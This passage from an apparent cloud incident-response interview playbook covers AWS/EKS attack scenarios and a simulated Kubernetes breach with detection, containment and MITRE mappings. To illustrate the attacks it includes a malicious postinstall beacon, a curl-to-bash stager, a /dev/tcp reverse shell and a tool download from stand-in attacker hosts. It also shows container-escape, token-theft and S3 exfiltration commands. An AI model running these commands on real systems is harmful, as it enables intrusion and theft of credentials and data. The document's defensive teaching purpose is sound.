Lambda functions legitimately access Secrets Manager during initialization. Distinguish: (1) Normal access is to 1-5 specific secrets at start. 2) 47 secrets accessed in 60 seconds is never legitimate. (3) ListSecrets is almost never needed by application code — it's an enumeration call. (4) Is the access happening mid-invocation vs at cold start?

### 6. Root Cause Analysis Steps

1) Identify the command injection vector from API Gateway access logs — look for shell metacharacters in request parameters. 2) Pull CloudTrail for all GetSecretValue events from the Lambda execution role. 3) List all secrets accessed — work with App team to determine which were critical. 4) Check for any outbound connections made during the exploit window (VPC Flow Logs). 5) Review Lambda function code for the injection point.

### 7. Containment Workflow

1) Disable the Lambda function (set concurrency to 0) immediately. 2) Rotate all 47 accessed secrets. 3) Restrict secretsmanager policy to list only specific secret ARNs the function needs. 4) Patch the command injection vulnerability. 5) Add WAF rule to block shell metacharacters in API Gateway inputs. 6) Apply resource-based policy on secrets to deny access from Lambda except specific function ARNs.

### 8. Governance Implications

No application should have secretsmanager:GetSecretValue on "*". Every secret access permission must specify exact ARNs. Secrets must be tagged with owning service, and IAM policy condition must require matching resource tag. ListSecrets should be denied for all application roles — only security tooling needs discovery. Secrets rotation should be automated and enabled.

### 9. How to Explain in Interview

SCENARIO 10
## 10. IRSA External Abuse — Service Account JWT Used Outside VPC

Domain: IAM Privilege Escalation
### 1. Initial Attacker Foothold

Attacker exploits a container escape (via CVE-2022-0847 Dirty Pipe) in a payments pod and extracts the service account JWT from /var/run/secrets/kubernetes.io/serviceaccount/token before the container is killed.

### 2. Escalation Path

The pod's service account has an IRSA annotation binding it to an IAM role. From an external server, attacker calls: aws sts assume-role-with-web-identity --web-identity-token <JWT> --role-arn <arn>. The role has no aws:SourceVpc condition, so this succeeds from any IP. They now have temporary credentials for the payments IAM role.

### 3. Lateral Movement Technique

The payments role has S3 access to the payments data bucket and can read SSM parameters. Attacker accesses SSM Parameter Store where database passwords are stored as SecureString parameters. They also discover the role can assume a cross-account analytics role with access to 3 years of transaction data.

### 4. Detection Telemetry

CloudTrail: AssumeRoleWithWebIdentity from an external IP (not a VPC IP, not a pod CIDR). UserAgent: aws-cli vs expected AWS SDK with service-specific user agent. Falcon CIEM: ExternalIRSAAbuse alert — role assumed with web identity from non-VPC source. CIEM correlates this with the prior KernelTampering alert from the same pod.

### 5. False Positive Differentiation Logic

IRSA is normally called from within the pod — the AWS SDK automatically fetches the JWT and calls STS. External calls always use aws-cli or python boto3 with explicit --web-identity-token flag. No legitimate workload calls AssumeRoleWithWebIdentity from outside a VPC. This alert is virtually always a true positive.

### 6. Root Cause Analysis Steps

1) Identify which pod the JWT was stolen from via Falcon CWPP process telemetry. 2) Check the JWT expiry (default 24h for EKS) — how long did attacker have access? 3) Pull all CloudTrail events for the assumed role session. 4) Check if the role had aws:SourceVpc condition — if not, this was preventable. 5) List all role assumption paths from the stolen role (CIEM blast radius).

### 7. Containment Workflow

1) Modify the IAM role trust policy immediately: add aws:SourceVpc condition. 2) Invalidate the JWT by deleting and recreating the Kubernetes ServiceAccount. 3) Revoke the STS session: apply IAM deny policy with DateLessThan condition. 4) Rotate SSM parameters accessed by the attacker. 5) Add aws:SourceVpc as a mandatory condition on ALL IRSA roles — enforce via SCP.

### 8. Governance Implications

Every IRSA role trust policy must include aws:SourceVpc condition — this is a preventive CSPM Critical control. Any IRSA role without this condition triggers immediate remediation. KAC admission policy must enforce runAsNonRoot and seccompProfile to reduce likelihood of container escape that enables token extraction.

### 9. How to Explain in Interview

SCENARIO 11
## 11. EKS Node Compromise via Exposed Kubelet API (Port 10250)

Domain: EC2 Compromise
### 1. Initial Attacker Foothold

An EKS managed node group was deployed with a security group that inadvertently allows inbound port 10250 from 0.0.0.0/0 — a CSPM finding open for 34 days. Attacker discovers it via Shodan.

### 2. Escalation Path

The kubelet API at port 10250 without authentication (anonymous auth enabled) allows: listing all pods (GET /pods), reading pod logs (GET /containerLogs/namespace/pod/container), and executing commands in pods (POST /exec/namespace/pod/container). Attacker uses this to exec into every pod on the node.

### 3. Lateral Movement Technique

From exec access across all pods, attacker harvests environment variables, reads mounted secrets, and extracts service account tokens from /var/run/secrets. With service account tokens, they access the Kubernetes API to enumerate all resources cluster-wide.

### 4. Detection Telemetry

Falcon CWPP: KubeletAnonymousAuth alert on node. Anomalous commands executed across multiple containers from external source (kubelet API does not log through Kubernetes audit by default). CSPM Finding: SG 10250 open to 0.0.0.0/0 — 34 days. GuardDuty: Recon:EC2/PortProbeUnprotectedPort for the initial scanning.

### 5. False Positive Differentiation Logic

The kubelet port is only legitimately accessed by the API server (from within cluster) and monitoring agents. Any external access to port 10250 from a non-cluster IP is malicious by definition. GuardDuty port probe alert + kubelet anonymous auth enabled + security group misconfiguration = confirmed attack scenario.

### 6. Root Cause Analysis Steps

1) Pull all kubelet API request logs from CloudWatch (kubelet logs forwarded to CW). 2) Identify all exec and log requests made via the kubelet API from external IPs. 3) Determine which pods were accessed and what data was reachable. 4) Audit the security group creation — which CloudFormation/Terraform change opened port 10250. 5) Check anonymous auth config in kubelet configuration file.

### 7. Containment Workflow

1) Immediately update security group to remove port 10250 from 0.0.0.0/0. 2) Restrict to cluster API server CIDR only. 3) Enable Webhook authentication mode on kubelet (--authorization-mode=Webhook). 4) Disable anonymous auth (--anonymous-auth=false in kubelet config). 5) Rotate all service account tokens on the affected node. 6) Cordon and replace the node.

### 8. Governance Implications

CIS EKS Benchmark 3.2.1: Ensure kubelet anonymous auth is disabled. CIS 3.2.2: Ensure kubelet authorization mode is not AlwaysAllow. CSPM must flag any security group allowing inbound port 10250 or 10255 from 0.0.0.0/0 as Critical. EC2 security group reviews should include cluster ports in the audit scope.

### 9. How to Explain in Interview

SCENARIO 12
## 12. Supply Chain Attack — Compromised Helm Chart in Artifact Hub

Domain: Container Escape
### 1. Initial Attacker Foothold

An attacker takes over a popular third-party Helm chart on Artifact Hub by compromising the maintainer's GitHub account. They inject a malicious InitContainer into the chart that runs before the main application and exfiltrates cluster credentials.

### 2. Escalation Path

The malicious InitContainer runs as root, reads the service account token from /var/run/secrets, reads all mounted ConfigMaps and Secrets, and beacons the data to an external endpoint. Since it's an InitContainer, it completes before the main app starts and appears in pod logs as a normal initialization step.

### 3. Lateral Movement Technique

With the exfiltrated service account tokens, the attacker maps the effective permissions of each. A token from a namespace with broad permissions is used to list all pods and secrets cluster-wide, identifying higher-value targets for follow-up attacks.

### 4. Detection Telemetry

Falcon CWPP: First-seen outbound connection from InitContainer to external domain. SuspiciousChildProcess in init container context. Falcon Image Assessment: The Helm chart's InitContainer image fails trust verification — image is not from an approved registry. KAC: Blocks deployment if image policy is enforced. Network: Beacon to unknown domain from a container that should only be doing initialization tasks.

### 5. False Positive Differentiation Logic

InitContainers legitimately run setup tasks and may make network calls (waiting for dependencies, downloading config). Distinguish: (1) Is the InitContainer image from an approved registry and cryptographically signed? (2) Is it making calls to an unknown external domain? (3) Does the Helm chart changelog justify the new InitContainer? (4) Is the InitContainer reading secrets or env vars unnecessarily?

### 6. Root Cause Analysis Steps

1) Compare new Helm chart version against previous known-good version (git diff of chart templates). 2) Identify when the Artifact Hub chart was modified — check chart maintainer's GitHub activity. 3) Pull Falcon telemetry for all deployments of the affected Helm chart across the organization. 4) Extract the InitContainer image — sandbox it to confirm malicious behavior. 5) Enumerate all namespaces where the chart was deployed.

### 7. Containment Workflow

1) Immediately helm rollback to the last known-good version in all affected namespaces. 2) Rotate all service account tokens in affected namespaces. 3) Block the malicious InitContainer image in KAC image policy. 4) Add the C2 domain/IP to DNS blocklist and security group deny. 5) Pin all Helm chart versions to specific digests, not floating version tags.

### 8. Governance Implications

All third-party Helm charts must be pulled into an internal Harbor or ECR registry, scanned and signed before use. No direct Artifact Hub or public registry pulls in production. Helm chart updates require security review and testing in a sandbox before production rollout. OPA/KAC policy to block InitContainers from unapproved registries.

### 9. How to Explain in Interview

SCENARIO 13
## 13. AWS Config Rule Weaponization — Persistent Backdoor via Trusted Service

Domain: Cross-Account Role Abuse
### 1. Initial Attacker Foothold

A contractor with temporary AWS access uses their credentials to create a backdoor before their access is scheduled to expire. They create an AWS Config rule with a Lambda remediation action.

### 2. Escalation Path

The Lambda is designed to re-create an IAM role with AdministratorAccess every time AWS Config runs the rule (every 24 hours). Even if defenders detect and delete the backdoor role, Config will recreate it within 24 hours. The Lambda itself uses a legitimate AWS service (Config) as its trigger, making it blend in with normal Config activity.

### 3. Lateral Movement Technique

With persistent admin-level IAM access, attacker can access any resource in the account across sessions. They use time in low and slow — reading data incrementally over weeks to avoid volume-based detection, focusing on highly sensitive data like executive communications in S3.

### 4. Detection Telemetry

CSPM: Config rule with Lambda remediation pointing to a function with IAM admin permissions. Lambda function performing iam:CreateRole outside of IaC pipeline. CloudTrail: Config:PutRemediationConfigurations by contractor account. CIEM: AnomalousRoleAssumption when attacker uses the backdoor role from external IP. Lambda:CreateFunction by a principal that should not have that permission.

### 5. False Positive Differentiation Logic

AWS Config remediation actions are legitimate and widely used for auto-remediation. Distinguish: (1) Is the remediation Lambda in the approved function inventory? (2) Does the Lambda's role have IAM administrative permissions? (3) Was the Config rule created through IaC pipeline or direct console/API? (4) Does the rule match a known compliance requirement?

### 6. Root Cause Analysis Steps

1) Pull CloudTrail for Config:PutRemediationConfigurations — who created the rule and when. 2) Review the remediation Lambda's code — what IAM actions does it perform? 3) List all IAM roles created by the Lambda in the past 30 days. 4) Cross-reference creator with HR data — was this a contractor or former employee? 5) Check if any roles created by the Lambda were assumed from external IPs.

### 7. Containment Workflow

1) Disable the Config rule (set rule to inactive state). 2) Delete the remediation Lambda. 3) Delete the backdoor IAM role and revoke all active sessions. 4) Revoke contractor credentials immediately. 5) Add SCP: deny Lambda:CreateFunction and config:PutRemediationConfigurations for non-pipeline principals. 6) Audit all Config rules for Lambda remediations pointing to unknown functions.

### 8. Governance Implications

All AWS Config rules must be created through IaC pipeline (enforced by SCP denying direct console/API creation). Lambda functions with IAM permissions require security team approval gate. Contractor access must be time-boxed with automated expiry — no manual deprovisioning. Joiner-Mover-Leaver process must be automated against HR system.

### 9. How to Explain in Interview

SCENARIO 14
## 14. Cryptomining via Exposed Docker Socket on EC2

Domain: EC2 Compromise
### 1. Initial Attacker Foothold

A development EC2 instance running Docker had the Docker socket (/var/run/docker.sock) mounted inside a container for local development convenience. A vulnerable web service in that container allowed command injection, giving the attacker access to the Docker socket.

### 2. Escalation Path

With Docker socket access, attacker can run any Docker command as root on the host. They run: docker run --rm -it --privileged --net=host --pid=host -v /:/host ubuntu bash. This gives them a root shell on the host with the entire filesystem mounted at /host.

### 3. Lateral Movement Technique

From the host shell, attacker reads the EC2 instance profile credentials from the metadata service, discovers IAM permissions, and pivots to S3 and EC2 across the account. They also deploy an XMRig cryptominer container configured to hide behind 40% CPU usage to avoid threshold alerts.

### 4. Detection Telemetry

Falcon CWPP: SuspiciousDockerSocketAccess — process accessing /var/run/docker.sock from within container. Docker run command spawning a privileged --net=host container. CryptominingActivity.XMRig once miner starts. Falcon CSPM: docker.sock mounted in container volume as Critical finding. EC2 cost anomaly: compute costs spike 340% suggesting cryptomining.

### 5. False Positive Differentiation Logic

Docker-in-Docker (DinD) is used by some CI/CD pipelines legitimately. However: (1) Production workloads never need docker.sock mounted. (2) Development instances mounting docker.sock should be isolated. (3) XMRig process or connection to known mining pool IPs is never legitimate. (4) The privileged --net=host run pattern from within a container is a strong indicator.

### 6. Root Cause Analysis Steps

1) Identify the command injection point via the web service request logs. 2) Trace the docker socket access via Falcon process telemetry. 3) Review the docker-compose or pod spec that mounted /var/run/docker.sock. 4) Pull all docker commands run via the socket from Docker daemon logs. 5) CloudTrail: all API calls made with the instance profile after IMDS access.

### 7. Containment Workflow

1) Terminate the cryptomining container immediately. 2) Terminate the compromised EC2 instance and replace. 3) Remove docker.sock mounts from ALL non-CI environments (enforce via CSPM). 4) Patch the command injection vulnerability. 5) Rotate instance profile and all credentials accessible from the instance.

### 8. Governance Implications

CSPM Critical policy: docker.sock mounted in any container is an immediate finding requiring remediation. Development environments must be isolated in separate VPCs with no access to production resources. Production containers must never run with Docker daemon socket access. Use rootless Docker or Podman for development where Docker-level access is needed.

### 9. How to Explain in Interview

SCENARIO 15
## 15. EKS etcd Direct Access — Cluster-Wide Secret Extraction

Domain: EKS RBAC Misconfiguration
### 1. Initial Attacker Foothold

The etcd cluster backing an EKS-like self-managed Kubernetes cluster had port 2379 accessible within the VPC without authentication (client certificate auth disabled). An internal attacker on a developer instance discovers this during network enumeration.

### 2. Escalation Path

Using etcdctl: ETCDCTL_API=3 etcdctl --endpoints=https://etcd:2379 get / --prefix --keys-only. This lists every key in etcd. The attacker then fetches: all Kubernetes Secrets (stored base64-encoded in etcd), all ConfigMaps, all ServiceAccount tokens, and all RBAC configurations.

### 3. Lateral Movement Technique

With all service account tokens extracted, attacker identifies the most privileged ones (cluster-admin service accounts used by operators). They use these tokens to create new ClusterRoleBindings for attacker-controlled service accounts, establishing persistence that will survive etcd restoration unless the operator secret is also rotated.

### 4. Detection Telemetry

Falcon CWPP: UnauthorizedAPIAccess.etcd — etcdctl process making connections to etcd endpoint from unauthorized source. Network anomaly: First-time client connecting to etcd port from developer instance IP. CSPM Finding: etcd port 2379 accessible without client certificate authentication — Critical. CloudTrail: No record (etcd access is not CloudTrail-logged).

### 5. False Positive Differentiation Logic

etcd is only legitimately accessed by the Kubernetes API server and etcd members. Any other client is suspicious. The process making the connection (etcdctl or curl) from a non-API-server host is always anomalous. This alert has near-zero false positive rate.

### 6. Root Cause Analysis Steps

1) Pull network flow logs for connections to port 2379 from non-API-server IPs. 2) Identify the developer instance and how it reached etcd (VPC routing, security group gap). 3) Audit the etcd configuration — why was client cert auth disabled? 4) Determine all keys read from etcd audit logs (if etcd audit logging was enabled). 5) Assume full cluster compromise — all secrets must be rotated.

### 7. Containment Workflow

1) Enable etcd client certificate authentication immediately. 2) Restrict security group: etcd port 2379 accessible only from API server CIDRs. 3) Rotate ALL secrets and service account tokens cluster-wide — full secret rotation. 4) Delete and recreate any ClusterRoleBindings created during the incident. 5) Audit all RBAC configurations for attacker-added bindings.

### 8. Governance Implications

CIS Kubernetes 1.2.x: etcd must require client certificate authentication. etcd must not be network-accessible except from the API server. etcd data must be encrypted at rest (--encryption-provider-config). For EKS, AWS manages etcd — this scenario applies to self-managed clusters or Kops deployments. Regular CIS benchmark scans via CSPM must include etcd security controls.

### 9. How to Explain in Interview


---

# PART VI: ENTERPRISE BREACH SIMULATION

> Multi-stage Kubernetes breach walkthrough with real CrowdStrike Falcon telemetry, detection events, and MITRE ATT&CK mapping.

---

# Cloud Security Complete Playbook
## Senior Cloud Incident Responder & CNAPP Security Architect

---

> **Document Coverage:** Enterprise Kubernetes Breach Simulation | Incident & Alert Catalog | CWPP & CSPM Deep Dive | 5 Real Scenarios | Interview Pitch
>
> **Tools Referenced:** CrowdStrike Falcon (CWPP, CSPM, CIEM, KAC) | AWS EKS | ArgoCD | GitHub Actions
>
> **Frameworks:** MITRE ATT&CK | NIST CSF | CIS Benchmarks | GDPR | HIPAA

---

# PART 1: ENTERPRISE KUBERNETES SECURITY BREACH SIMULATION

## Executive Threat Narrative

**Scenario:** A financially motivated threat actor (TTPs consistent with SCATTERED SPIDER / UNC3944 lineage) compromises a Fortune 500 retail company's AWS-hosted EKS production cluster. Entry point is a poisoned open-source dependency in the CI/CD pipeline. The attack spans 11 days from initial access to data exfiltration, touching 4 AWS accounts, 2 EKS clusters, and 37 IAM roles.

**Environment:**
- AWS multi-account (Landing Zone, hub-spoke model)
- EKS v1.28 with managed node groups (AL2 AMI)
- ArgoCD + GitHub Actions CI/CD
- Falco disabled post-migration (replaced by Falcon sensor — attacker didn't know this)
- 3 microservices namespaces: `payments`, `inventory`, `auth`

---

## Attack Stage 1: CI/CD Supply Chain Poisoning

### Attacker Intent

The attacker identifies that the company pulls a popular internal NPM package `@company/api-utils` from a private GitHub registry. They register a lookalike package name on the public NPM registry with a higher version number, exploiting dependency confusion. The malicious package contains a post-install script that beacons out and drops a lightweight stager into the build container.

### Attack Mechanics

```bash
# Malicious package.json post-install hook
"scripts": {
  "postinstall": "node -e \"require('https').get('https://c2.attacker[.]io/s?h='+require('os').hostname());\""
}

# Inside GitHub Actions runner (ubuntu-latest)
# Stager downloads a base64-encoded loader
curl -sk https://c2.attacker[.]io/l | base64 -d | bash
```

The loader enumerates GitHub Actions environment variables:
```bash
env | grep -E 'GITHUB_TOKEN|AWS_|ARGO|KUBECONFIG|SECRET'
```

It exfiltrates:
- `GITHUB_TOKEN` (org-scoped, not repo-scoped)
- `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` (assume-role for ECR push)
- ArgoCD admin credentials stored as a plaintext Actions secret

### Detection Mechanism — Falcon CWPP + KAC

**Falcon Sensor on the Actions Runner (self-hosted):**
- Process lineage: `node → bash → curl → base64 → bash` — anomalous shell spawned from build tool
- Network IOC: first-seen external egress to `c2.attacker[.]io` from build infra
- `GITHUB_TOKEN` appears in process memory and is copied to a network socket (memory scraping detection)

**KAC — Policy Enforcement:**
- The poisoned image is pushed to ECR. When ArgoCD attempts to deploy it, KAC evaluates the image against the Falcon Image Assessment policy
- Image scan result: `CRITICAL` — embedded shell script, network call in layer diff
- KAC blocks the admission with: `AdmissionWebhook DENY — ImageAssessmentPolicy:UnscannedOrFailed`

### Telemetry Generated

```json
{
  "event_type": "ProcessRollup2",
  "ComputerName": "github-runner-prod-07",
  "ImageFileName": "/usr/bin/bash",
  "CommandLine": "bash -i >& /dev/tcp/c2.attacker.io/4444 0>&1",
  "ParentImageFileName": "/usr/local/bin/node",
  "ParentCommandLine": "node postinstall.js",
  "NetworkConnections": [{"RemoteAddressIP4": "185.220.xx.xx", "RemotePort": 4444}],
  "DetectionName": "SuspiciousChildProcess.BuildTool",
  "Severity": "High",
  "MITRE_Technique": "T1059.004"
}
```

**Falcon CSPM Alert:**
```
POLICY: GitHub Actions secret exposed in build log
RESOURCE: actions/workflow/deploy-payments.yml
FINDING: AWS_SECRET_ACCESS_KEY referenced in step output — not masked
SEVERITY: Critical
CIS_BENCHMARK: 4.1.1
```

### Why Traditional Tools Would Miss It

| Tool Type | Gap |
|---|---|
| SAST/DAST | Analyzes source code, not runtime behavior of build toolchain |
| ECR Vulnerability Scanning | Scans known CVEs, does not detect behavioral malware in layers |
| CloudTrail alone | Records API calls but not process-level behavior inside Actions runner |
| GitHub Advanced Security | Detects secret leakage in code, not in memory or network exfil |
| WAF/Network IDS | Encrypted HTTPS beacon; no signature match without TLS inspection |

### How Runtime Security Stopped It

Falcon CWPP's eBPF sensor on the self-hosted runner captures syscall-level telemetry. The `execve` chain from `node → bash → curl` triggers the "Suspicious Process Chain in Build Environment" behavioral detection. The KAC admission webhook prevents the tainted image from ever running in production. Even though CI/CD was compromised, the blast radius was contained at the Kubernetes boundary.

---

## Attack Stage 2: Container Runtime Compromise & Drift

### Attacker Intent

The `GITHUB_TOKEN` exfiltrated in Stage 1 had `packages:write` and `repo` scope (over-privileged — a CSPM finding that was open for 47 days). The attacker uses it to modify a legitimate workflow, injecting a sidecar into the `payments` deployment manifest that passes KAC (because it mimics a legitimate Datadog agent image name from a controlled ECR repo the attacker now has write access to).

### Attack Mechanics

The attacker pushes image `123456789.dkr.ecr.us-east-1.amazonaws.com/datadog-agent:7.43.1-PATCHED` — visually identical to prod. ArgoCD syncs. Container starts.

Inside the container, 3 minutes after start:
```bash
# Attacker drops tools post-start (container drift)
wget -q http://185.220.xx.xx/tools.tar.gz -O /tmp/.hidden/tools.tar.gz
tar -xzf /tmp/.hidden/tools.tar.gz -C /tmp/.hidden/
chmod +x /tmp/.hidden/pspy64 /tmp/.hidden/linpeas.sh /tmp/.hidden/chisel
```

Then attempts kernel exploitation for privilege escalation:
```bash
# CVE-2022-0847 (Dirty Pipe) attempt
/tmp/.hidden/dirtypipe /etc/passwd
# Followed by:
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

### Detection Mechanism — Falcon CWPP Container Drift + Runtime Detection

**Container Drift Detection:**

Falcon establishes a golden image fingerprint at container start — a cryptographic inventory of every binary, library, and executable in the container filesystem. Any new file written post-start that wasn't in the original image layer is flagged as drift.

```
DRIFT ALERT:
Container: payments-7d4f9c-xk2p9
Namespace: payments
New executable written: /tmp/.hidden/pspy64
  SHA256: 3a7f1c... (known offensive tool)
New executable written: /tmp/.hidden/chisel
  SHA256: 9b2d4e... (known tunneling tool)
Detection: ContainerDrift.OffensiveToolDrop
Severity: Critical
```

**Runtime Detection — PotentialKernelTampering:**
```json
{
  "event_type": "KernelTampering",
  "DetectionName": "PotentialKernelTampering",
  "Description": "Process attempted to write to /proc/sysrq-trigger and modify kernel memory maps. Dirty Pipe exploitation pattern detected.",
  "ProcessImageFileName": "/tmp/.hidden/dirtypipe",
  "TargetFile": "/etc/passwd",
  "SyscallSequence": ["open(O_WRONLY)", "splice()", "write(pipe_offset=0)"],
  "ContainerID": "a3f7b291cc4e",
  "PodName": "payments-7d4f9c-xk2p9",
  "Severity": "Critical",
  "MITRE_Technique": "T1611"
}
```

**Interactive Intrusion Detection:**
```
ALERT: InteractiveContainerSession
  User: root (UID 0) spawned interactive shell
  Command: nsenter --target 1 --mount --uts --ipc --net --pid -- bash
  Effect: Container escape attempt to host namespace
  Detection: ContainerEscape.NsenterToHostNamespace
  Action: PREVENT (process killed, pod quarantined)
```

### Telemetry Generated

```
T+0:00  Container payments-7d4f9c-xk2p9 started
T+3:14  DNS query: 185.220.xx.xx (first seen domain)
T+3:16  wget spawned from entrypoint process (drift begins)
T+3:22  3 executables written to /tmp/.hidden/ (DRIFT EVENT)
T+3:45  dirtypipe executed — kernel exploit sequence (KERNEL TAMPER)
T+3:47  nsenter with host namespace flags (CONTAINER ESCAPE — BLOCKED)
T+3:47  Pod quarantined — network policy auto-applied
T+3:47  Falcon RTR session initiated (auto-response)
```

### Why Traditional Tools Would Miss It

- **Image scanning (Trivy, Snyk):** Scans original image. Drift tools were downloaded *after* container start — invisible to pre-deploy scanning
- **Kubernetes audit logs:** Record pod creation/deletion, not in-container file writes or syscall sequences
- **Network policies alone:** Cannot block intra-container file system operations or kernel exploit attempts
- **OPA/Gatekeeper:** Policy enforced at admission time, not runtime. Once the pod is running, OPA is blind
- **Node-level HIDS (OSSEC, AIDE):** Monitors host filesystem, not container overlay filesystems independently

### How Runtime Security Stopped It

Falcon's eBPF-based drift engine tracks every `write()` and `execve()` syscall against the immutable image manifest. The `PotentialKernelTampering` ML model fired before privilege escalation succeeded. The container escape prevention policy killed the `nsenter` process and triggered automated pod isolation via Kubernetes Network Policy injection through the Falcon operator.

---

## Attack Stage 3: IAM Privilege Escalation

### Attacker Intent

The `nsenter` was blocked, but the attacker already extracted the pod's service account token from the container environment before the kill:

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# JWT with: system:serviceaccount:payments:payments-api-sa
```

The payments-api-sa service account has an IRSA (IAM Roles for Service Accounts) binding to `arn:aws:iam::123456789:role/payments-api-role`. This role has `iam:PassRole`, `sts:AssumeRole`, and `ec2:*` — a CSPM finding rated HIGH that had been open for 23 days.

### Attack Mechanics

```bash
# From attacker C2 — using extracted service account JWT against K8s API
curl -H "Authorization: Bearer <JWT>" https://k8s-api.internal/api/v1/secrets

# Lateral movement via IRSA
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::123456789:role/payments-api-role \
  --web-identity-token <JWT> \
  --role-session-name "legitimate-app-session"
```

With `payments-api-role`, the attacker then enumerates and assumes additional roles:
```bash
# Enumerate assumable roles
aws iam list-roles | jq '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.AWS)'

# Finds: payments-api-role can assume data-lake-admin-role
aws sts assume-role \
  --role-arn arn:aws:iam::999888777:role/data-lake-admin-role \
  --role-session-name "app-session"

# Now has: S3:*, Glue:*, Athena:*, LakeFormation:*
```

### Detection Mechanism — Falcon CIEM + CSPM

**CIEM Anomaly Detection:**
```
ALERT: AnomalousRoleAssumption
  Principal: payments-api-role
  AssumedRole: data-lake-admin-role
  SourceIP: 185.220.xx.xx (external — NOT a pod IP, NOT a VPC IP)
  UserAgent: aws-cli/2.x — NOT consistent with application SDK patterns
  Time: 02:47 UTC (outside business hours)
  BaselineDeviation: Role never assumed externally in 180-day history
  Confidence: 97%
  MITRE: T1078.004 (Valid Accounts: Cloud Accounts)
```

**CSPM Policy Violations:**
```
FINDING ID: CSPM-IAM-0441
  Title: IAM role with iam:PassRole and sts:AssumeRole grants excessive privilege
  Resource: payments-api-role
  Age: 23 days
  Severity: HIGH (now promoted to CRITICAL — actively exploited)

FINDING ID: CSPM-IAM-0119
  Title: Cross-account role assumption without MFA or IP condition
  Resource: data-lake-admin-role trust policy
  Remediation: Add aws:SourceVpc or aws:MultiFactorAuthPresent condition
```

**CIEM Effective Permission Analysis:**
```
Effective blast radius of payments-api-sa compromise:
  Direct permissions: EC2:*, S3:GetObject (payments bucket)
  Via PassRole chain:
    → data-lake-admin-role: S3:* (ALL buckets), Glue:*, Athena:*
    → logging-shipper-role: CloudTrail:DeleteTrail, CloudTrail:StopLogging ← CRITICAL
  Total sensitive permissions: 847
  Data stores accessible: 23 S3 buckets, 4 RDS instances, 2 Redshift clusters
```

### Telemetry Generated

CloudTrail events correlated in Falcon Insight:
```json
[
  {"eventName": "AssumeRoleWithWebIdentity", "sourceIPAddress": "185.220.xx.xx", "userAgent": "aws-cli/2.13"},
  {"eventName": "AssumeRole", "requestParameters": {"roleArn": "data-lake-admin-role"}, "sourceIPAddress": "185.220.xx.xx"},
  {"eventName": "ListBuckets", "sourceIPAddress": "185.220.xx.xx"},
  {"eventName": "GetBucketPolicy", "requestParameters": {"bucketName": "prod-customer-pii-lake"}},
  {"eventName": "StopLogging", "requestParameters": {"name": "prod-cloudtrail"}, "errorCode": "AccessDenied"}
]
```

### Why Traditional Tools Would Miss It

- **GuardDuty:** Would flag `UnauthorizedAccess:IAMUser/TorIPCaller` but misses the subtle role chaining pattern and the IRSA-external-IP anomaly correlation
- **CloudTrail alone:** Shows events but no behavioral baseline — no way to know `185.220.xx.xx` is attacker vs. new legitimate origin without UEBA
- **IAM Access Analyzer:** Shows resource policies and external access, not runtime anomalous assumption patterns
- **SIEM without cloud context:** Correlates events but lacks the CIEM effective permissions graph — can't determine blast radius in real time

### How Runtime Security Stopped It

Falcon CIEM's identity graph had pre-computed the complete effective permission set for `payments-api-sa`, including all transitive role assumption paths. When the external-IP assumption fired, CIEM correlated it with the active container incident (same JWT, same role ARN) creating a unified attack timeline. Falcon Fusion automated response:

1. Revoked the IRSA binding (modified the IAM role trust policy to add `aws:SourceVpc` condition)
2. Tagged the role as compromised in AWS Config
3. Triggered an SCP block on `data-lake-admin-role` assumption from external IPs
4. Notified the SOC with full blast radius visualization

---

## Attack Stage 4: Lateral Movement & Data Exfiltration

### Attacker Intent

Before the SCP blocked them, the attacker exfiltrated 47GB of customer PII from the `prod-customer-pii-lake` S3 bucket using `aws s3 sync` to an attacker-controlled S3 bucket in a separate AWS org. They also attempted to move laterally into the second EKS cluster (staging) via a misconfigured cross-cluster IAM trust.

### Attack Mechanics

```bash
# Exfiltration via S3 API
aws s3 sync s3://prod-customer-pii-lake/ s3://attacker-bucket-us-east-1/ \
  --no-progress --quiet

# Cross-cluster lateral movement
kubectl --server=https://staging-k8s-api --token=<JWT> get secrets -A
```

### Detection

**Falcon CSPM — S3 Data Exfiltration:**
```
ALERT: S3.LargeVolumeExternalTransfer
  Source: prod-customer-pii-lake
  Destination: 987654321.s3.amazonaws.com (external AWS account, not in org)
  Volume: 47.3 GB in 4 minutes
  API calls: s3:GetObject × 892,441
  Principal: data-lake-admin-role/app-session
  Correlation: LINKED to active IAM compromise incident INC-2024-0847
```

**CIEM — aws-auth Misconfiguration:**
```
CSPM FINDING: K8S-AUTH-0012
  Title: IAM role mapped to cluster-admin in non-production cluster
  Resource: aws-auth ConfigMap, cluster: staging-eks-01
  Mapped Role: payments-api-role → system:masters
  Risk: Any principal assuming payments-api-role has cluster-admin on staging
  Age: 67 days
```

---

## MITRE ATT&CK Complete Mapping

| Stage | Technique ID | Technique Name | Sub-technique |
|---|---|---|---|
| CI/CD Poisoning | T1195.001 | Supply Chain Compromise | Compromise Software Dependencies |
| CI/CD Poisoning | T1552.001 | Unsecured Credentials | Credentials in Files (env vars) |
| Container Drift | T1608.001 | Stage Capabilities | Upload Malware |
| Kernel Exploit | T1611 | Escape to Host | — |
| Kernel Exploit | T1068 | Exploitation for Privilege Escalation | — |
| IAM Escalation | T1078.004 | Valid Accounts | Cloud Accounts |
| IAM Escalation | T1548.005 | Abuse Elevation Control | Temporary Elevated Cloud Access |
| Role Chaining | T1550.001 | Use Alternate Auth Material | Application Access Token |
| Defense Evasion | T1562.008 | Impair Defenses | Disable Cloud Logs (attempted) |
| Lateral Movement | T1021.007 | Remote Services | Cloud Services |
| Exfiltration | T1537 | Transfer Data to Cloud Account | — |
| Discovery | T1526 | Cloud Service Discovery | — |

---

## NIST CSF Mapping

| CSF Function | Category | Finding | Gap |
|---|---|---|---|
| **Identify** | ID.AM-2 | Software inventory didn't include transitive NPM deps | SBOM incomplete |
| **Identify** | ID.RA-1 | IAM over-privilege known for 23-67 days, not remediated | Risk acceptance process broken |
| **Protect** | PR.AC-4 | IRSA roles lacked source IP/VPC conditions | IAM hardening gap |
| **Protect** | PR.DS-5 | S3 bucket lacked object-level logging + DLP tagging | Data protection gap |
| **Protect** | PR.IP-3 | CI/CD pipeline had no dependency pinning or registry isolation | Supply chain control gap |
| **Detect** | DE.CM-3 | No UEBA baseline on IRSA external assumptions | Detection coverage gap |
| **Respond** | RS.RP-1 | Incident response playbook didn't cover IRSA compromise | Playbook gap |
